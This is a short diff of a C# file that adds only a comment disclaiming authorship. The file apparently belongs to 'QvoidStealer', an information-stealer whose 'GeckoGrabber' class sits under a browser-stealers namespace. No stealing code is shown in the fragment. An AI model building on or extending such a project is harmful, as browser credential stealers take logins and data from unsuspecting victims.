@@ -4,6 +4,8 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
+//I didn't write this implementation, if you are the owner of this code contact me for a credit.
+
 namespace QvoidStealer.Miscellaneous.Stealers.Browsers
 {
     class GeckoGrabber
